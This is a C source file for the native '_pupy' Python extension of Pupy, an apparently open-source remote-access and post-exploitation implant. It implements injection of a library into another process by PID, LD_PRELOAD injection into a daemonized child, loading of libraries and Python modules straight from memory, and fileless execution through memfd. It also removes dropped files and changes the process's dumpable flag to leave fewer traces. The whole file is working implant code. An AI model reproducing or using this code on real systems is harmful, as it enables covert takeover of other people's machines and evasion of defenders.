/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#define _GNU_SOURCE

#ifdef _PUPY_SO
#   define PY_SSIZE_T_CLEAN
#	include <Python.h>
#else
#	include "Python-dynload.h"
#	include "Python-dynload-os.h"
#endif

#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include <dlfcn.h>
#include <limits.h>
#include "debug.h"
#include "daemonize.h"
#include <arpa/inet.h>
#include "tmplibrary.h"
#include <sys/mman.h>
#ifdef Linux
#include <sys/prctl.h>
#include "memfd.h"
#ifdef _FEATURE_INJECTOR
#include "injector.h"
#endif
#endif

#include "ld_hooks.h"
#include "revision.h"

static const char module_doc[] = DOC("Builtins utilities for pupy");
static PyObject *ExecError;

#ifdef _FEATURE_PATHMAP
static PyObject *py_pathmap = NULL;

#ifndef _LD_HOOKS_NAME
static
#endif
const char *__pathmap_callback(const char *path, char *buf, size_t buf_size)
{
    PyGILState_STATE gil_state;
    PyObject* result = NULL;
    char *c_result = NULL;

    if (!strncmp(path, "f:", 2) ||
        !strncmp(path, "pupy:/", 6) ||
        !strncmp(path, "pupy/", 5))
    {
        dprint("__pathmap_callback(%s) -> pupy -> NULL\n");
        return NULL;
    }

    if (!py_pathmap) {
        dprint("__pathmap_callback: uninitialized (should not happen)\n");
        return path;
    }

    dprint("__pathmap_callback(%s) - get (%p (%d))\n",
        path, py_pathmap, Py_RefCnt(py_pathmap));

    gil_state = PyGILState_Ensure();

    result = PyDict_GetItemString(py_pathmap, path);

    dprint("__pathmap_callback(%s) -> %p (%d)\n",
        path, result, Py_RefCnt(result));

    if (!result) {
        PyGILState_Release(gil_state);
        return path;
    }

    if (result == Py_None) {
        dprint("__pathmap_callback: None\n");
        PyGILState_Release(gil_state);
        return NULL;
    }

    c_result = PyBytes_AsString(result);
    if (!c_result) {
        dprint("__pathmap_callback: Not a string object\n");
        PyErr_Clear();
        PyGILState_Release(gil_state);
        return path;
    }

    strncpy(buf, c_result, buf_size);
    PyGILState_Release(gil_state);
    return buf;
}
#endif

static PyObject *Py_get_arch(PyObject *self, PyObject *args)
{
#ifdef __x86_64__
    return Py_BuildValue("s", "x64");
#elif __i386__
    return Py_BuildValue("s", "x86");
#elif __arm__
    return Py_BuildValue("s", "arm");
#else
    return Py_BuildValue("s", "unknown");
#endif
}

static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
{
    const char *lpCmdBuffer;
    const char *lpDllBuffer;
    uint32_t dwDllLenght;
    PyObject* py_HookExit;

    if (!PyArg_ParseTuple(args, "zs#O", &lpCmdBuffer, &lpDllBuffer, &dwDllLenght, &py_HookExit))
        return NULL;

    char ldobject[PATH_MAX] = {};
    int cleanup_workaround = 0;
    int cleanup = 1;

    int fd = drop_library(ldobject, PATH_MAX, lpDllBuffer, dwDllLenght);
    if (fd < 0) {
        dprint("Couldn't drop library: %m\n");
        return NULL;
    }

#ifdef Linux
    if (is_memfd_path(ldobject)) {
        cleanup_workaround = 1;
        cleanup = 0;
    }
#endif

    char cmdline[PATH_MAX*2] = {};
    snprintf(
        cmdline, sizeof(cmdline), "LD_PRELOAD=%s HOOK_EXIT=%d CLEANUP=%d exec %s 1>/dev/null 2>/dev/null",
        ldobject,
        PyObject_IsTrue(py_HookExit),
        cleanup,
        lpCmdBuffer
    );

    dprint("Program to execute in child context: %s\n", cmdline);

#if defined(Linux) && !defined(DEBUG)
    if (cleanup_workaround)
        prctl(4, 1, 0, 0, 0);
#endif

    pid_t pid = daemonize(0, NULL, NULL, false);
    if (pid == 0) {
        /* Daemonized context */
        dprint("Daemonization complete - client\n");
        execl("/bin/sh", "/bin/sh", "-c", cmdline, NULL);
        unlink(ldobject);
        exit(255);
    }

    dprint("Daemonization complete - server\n");
    if (cleanup_workaround) {
        sleep(2);
        close(fd);
    }

#if defined(Linux) && !defined(DEBUG)
    if (cleanup_workaround)
        prctl(4, 0, 0, 0, 0);
#endif

    if (pid == -1) {
        dprint("Couldn\'t daemonize: %m\n");
        unlink(ldobject);
        return PyLong_FromLong(-1);
    }

    return PyLong_FromLong(pid);
}

#ifdef Linux
#ifdef _FEATURE_INJECTOR
static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
    uint32_t dwPid;
    const char *lpDllBuffer;
    uint32_t dwDllLenght;
    int ret = 0;
    if (!PyArg_ParseTuple(args, "Is#", &dwPid, &lpDllBuffer, &dwDllLenght))
        return NULL;

    dprint("Injection requested. PID: %d\n", dwPid);

    char buf[PATH_MAX]={};
    int fd = drop_library(buf, PATH_MAX, lpDllBuffer, dwDllLenght);
    if (!fd) {
        PyErr_SetString(ExecError, "Couldn't drop library");
        return NULL;
    }

    int is_memfd = is_memfd_path(buf);

    dprint("Injecting %s to %d\n", buf, dwPid);

    injector_t *injector;

    if (injector_attach(&injector, dwPid) != 0) {
        PyErr_SetString(ExecError, "Injector attach failed");
        return NULL;
    }

#ifndef DEBUG
    if (is_memfd)
        prctl(4, 1, 0, 0, 0);
#endif

    if (injector_inject(injector, buf) == 0) {
        dprint("\"%s\" successfully injected\n", buf);
        ret = 1;
    }

    if (is_memfd) {
#ifndef DEBUG
        prctl(4, 0, 0, 0, 0);
#endif
        close(fd);
    } else {
        unlink(buf);
    }

    injector_detach(&injector);

    if (ret != 1) {
        PyErr_SetString(ExecError, injector_error());
        return NULL;
    }

    return PyBool_FromLong(0);
}
#endif


static PyObject *Py_memfd_is_supported(PyObject *self, PyObject *args)
{
    return PyBool_FromLong(pupy_memfd_supported());
}


static PyObject *Py_memfd_create(PyObject *self, PyObject *args, PyObject *kwargs)
{
    char memfd_path[PATH_MAX] = {};
    int fd = -1;
    const char *name = "";
    FILE *c_file;
    PyObject *py_file;
    PyObject *result;

    static const char* kwargs_defs[] = {
        "name", NULL
    };

    if (!PyArg_ParseTupleAndKeywords(args, kwargs, "|s", kwargs_defs, &name))
        return NULL;

    strncpy(memfd_path, name, sizeof(memfd_path));

    dprint("Py_memfd_create(%s)\n", name);
    fd = pupy_memfd_create(memfd_path, sizeof(memfd_path));

    if (fd == -1)
        return PyErr_SetFromErrno(PyExc_OSError);

    c_file = fdopen(fd, "w+b");
    if (!c_file) {
        close(fd);
        return PyErr_SetFromErrno(PyExc_OSError);
    }

    py_file = PyFile_FromFd(c_file, memfd_path, "w+b", -1, "", "\n", "", fclose);
    if (!py_file) {
        close(fd);
        return NULL;
    }

    result = Py_BuildValue("Os", py_file, memfd_path);
    Py_DecRef(py_file);

    return result;
}
#endif


static PyObject *Py_load_dll(PyObject *self, PyObject *args)
{
    char *lpDllBuffer;
    Py_ssize_t dwDllLenght;
    const char *dllname;
    PyObject *dataobj;
    if (!PyArg_ParseTuple(args, "sS", &dllname, &dataobj))
        return NULL;

    if (PyBytes_AsStringAndSize(dataobj, &lpDllBuffer, &dwDllLenght)==-1) {
            PyErr_Format(PyExc_ImportError,
                 "Py_load_dll : cannot convert bytes to char * : %s ", dllname);
            return NULL;
    }

    dprint("Py_load_dll(%s, buf=%p BufSize=%d)\n", dllname, lpDllBuffer, dwDllLenght);

    void * hmem = memdlopen(dllname, lpDllBuffer, dwDllLenght, RTLD_LOCAL | RTLD_NOW);
    if (!hmem) {
        dprint("Py_load_dll(): Couldn't load %s\n", dllname);
        PyErr_Format(ExecError, "Py_load_dll(): Couldn't load %s\n", dllname);
        return NULL;
    }
    dprint("Py_load_dll(): returning handle: %x\n",hmem);
    return PyLong_FromVoidPtr(hmem);
}


static PyObject *
Py_import_module(PyObject *self, PyObject *args) {
    char *data;
    Py_ssize_t size;
    char *initfuncname;
    char *modname;
    char *pathname;
    char *oldcontext;

    PyObject *dataobj;
    PyObject *spec;
    /* code, initfuncname, fqmodulename, path */
    if (!PyArg_ParseTuple(args, "SsssO:import_module",
          &dataobj,
          &initfuncname, &modname, &pathname, &spec)) {
        dprint("error in PyArg_ParseTuple()\n");
        return NULL;
    }

    dprint("DEBUG! %s@%s\n", initfuncname, modname);

    if (PyBytes_AsStringAndSize(dataobj, &data, &size)==-1) {
            PyErr_Format(PyExc_ImportError,
                 "cannot convert bytes to char * : %s ", pathname);
            return NULL;
    }

    dprint("import_module: init=%s mod=%s (%p:%lu)\n",
           initfuncname, modname, data, size);

    void *hmem = memdlopen(modname, data, size, RTLD_LOCAL | RTLD_NOW);
    if (!hmem) {
        dprint("Py_import_module(): Couldn't load %s\n", modname);
        PyErr_Format(PyExc_ImportError, "Py_load_dll(): Couldn't load %s\n", modname);
        return NULL;
    }

    PyObject *(*do_init)(void);
    do_init= dlsym(hmem, initfuncname);
    if (!do_init) {
        dprint("Couldn't find sym %s in %s: %m\n", initfuncname, modname);
        dlclose(hmem);
        return NULL;
    }

    oldcontext = _Py_PackageContext;
    _Py_PackageContext = modname;
    dprint("Call %s@%s (%p)\n", initfuncname, modname, do_init);
    PyObject *m = do_init();
    _Py_PackageContext = oldcontext;

    dprint("Call %s@%s (%p) - complete\n", initfuncname, modname, do_init);

    // multi phase init
    if (PyObject_TypeCheck(m, &PyModuleDef_Type)) {
        struct PyModuleDef *def;
        PyObject *state;

        m = PyModule_FromDefAndSpec((PyModuleDef*)m, spec);
        def = PyModule_GetDef(m);
        state = PyModule_GetState(m);
        if (state == NULL) {
            PyModule_ExecDef(m, def);
        }
        dprint("return from PyObject_TypeCheck\n", modname);
        return m;
    }
    PyObject *modules = NULL;
    modules = PyImport_GetModuleDict();
    PyObject *name = PyUnicode_FromString(modname);
    _PyImport_FixupExtensionObject(m, name, name, modules);

    Py_DECREF(name);

    if (PyErr_Occurred()) {
        dprint("error at the end\n");
            return NULL;
    }


    dprint("calling PyImport_ImportModule(%s)\n", modname);
    /* Retrieve from sys.modules */
    return PyImport_ImportModule(modname);
}

static PyObject *Py_mexec(PyObject *self, PyObject *args)
{
    const char *buffer = NULL;
    size_t buffer_size = 0;
    PyObject *argv_obj = NULL;
    PyObject *redirected_obj = NULL;
    PyObject *detach_obj = NULL;

//TODO: change all deprecated and broken s# notation in PyArg_ParseTuple
    if (!PyArg_ParseTuple(args, "s#OOO", &buffer, &buffer_size, &argv_obj, &redirected_obj, &detach_obj))
        return NULL;

    Py_ssize_t argc = PySequence_Length(argv_obj);
    if (argc < 1) {
        PyErr_SetString(ExecError, "Args not passed");
        return NULL;
    }

    bool redirected = PyObject_IsTrue(redirected_obj);
    bool detach =  PyObject_IsTrue(detach_obj);
    char **argv = (char **) malloc(sizeof(char*) * (argc + 1));
    if (!argv) {
        PyErr_SetString(ExecError, "Too many args");
        return NULL;
    }

    int i;
    for (i=0; i<argc; i++) {
        PyObject *arg = NULL;
        arg = PySequence_GetItem(argv_obj, i);
        if (arg)
            argv[i] = PyBytes_AsString(arg);
    }
    argv[argc] = NULL;

    int stdior[3] = { -1, -1, -1 };
    pid_t pid = memexec(buffer, buffer_size, (const char **) argv, stdior, redirected, detach);

    if (pid < 0) {
        PyErr_SetString(ExecError, "Can't execute");
        return NULL;
    }

    PyObject * p_stdin = Py_None;
    PyObject * p_stdout = Py_None;
    PyObject * p_stderr = Py_None;

    if (redirected) {
        p_stdin = PyFile_FromFd(fdopen(stdior[0], "w"), "mexec:stdin", "a", 0, "", "\n", "", fclose);
        p_stdout = PyFile_FromFd(fdopen(stdior[1], "r"), "mexec:stdout", "r", 0, "", "\n", "", fclose);
        p_stderr = PyFile_FromFd(fdopen(stdior[2], "r"), "mexec:stderr", "r", 0, "", "\n", "", fclose);

        //PyFile_SetBufSize(p_stdin, 0);
        //PyFile_SetBufSize(p_stdout, 0);
        //PyFile_SetBufSize(p_stderr, 0);
    }

    return Py_BuildValue("i(OOO)", pid, p_stdin, p_stdout, p_stderr);
}

static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
{
#ifdef _PUPY_SO
        return PyBool_FromLong(1);
#else
        return PyBool_FromLong(0);
#endif
}

static PyMethodDef methods[] = {
    { "is_shared", Py_is_shared_object, METH_NOARGS, DOC("Client is shared object") },
    { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
#ifdef Linux
#ifdef _FEATURE_INJECTOR
    { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS,
      DOC("reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure")
    },
#endif
    { "memfd_is_supported", Py_memfd_is_supported, METH_VARARGS, DOC("Check memfd is supported") },
    { "memfd_create", (PyCFunction) Py_memfd_create, METH_VARARGS | METH_KEYWORDS, DOC("Create memfd file") },
#endif
    { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
    { "import_module", Py_import_module, METH_VARARGS,
      DOC("import_module(data, size, initfuncname, path) -> module") },
    { "mexec", Py_mexec, METH_VARARGS, DOC("mexec(data, argv, redirected_stdio, detach) -> (pid, (in, out, err))") },
    { "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, DOC("ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid") },
    { NULL, NULL },     /* Sentinel */
};

static struct PyModuleDef PupyModuleDef =
{
//    PyModuleDef_HEAD_INIT,
    {
        { 0, 0, 1, NULL} ,           
        NULL, /* m_init */          
        0,    /* m_index */         
        NULL
    }, /* m_copy */          
    "_pupy", /* name of module */
    "", /* module documentation, may be NULL */
    -1,   /* size of per-interpreter state of the module, or -1 if the module keeps state in global variables. */
    methods
};

#ifdef _PUPY_DYNLOAD
#define FUNC_EXPORT PyMODINIT_FUNC
#else
#define FUNC_EXPORT void *
#endif

FUNC_EXPORT PyInit__pupy(void) {

    PyObject *pupy;
    //PyObject *pupy = Py_InitModule3("_pupy", methods, (char *) module_doc);
    dprint("creating pupy module ...\n");
    pupy = PyModule_Create(&PupyModuleDef);

    if (!pupy) {
        return NULL;
    }

    PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
    ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
    Py_INCREF(ExecError);
    PyModule_AddObject(pupy, "error", ExecError);

#ifdef _PUPY_SO
    //setup_jvm_class();
#endif

#ifdef _FEATURE_PATHMAP
    py_pathmap = PyDict_New();
    Py_INCREF(py_pathmap);
    PyModule_AddObject(pupy, "pathmap", py_pathmap);
#ifndef _LD_HOOKS_NAME
    set_pathmap_callback(__pathmap_callback);
#endif
#endif
    return pupy;
}
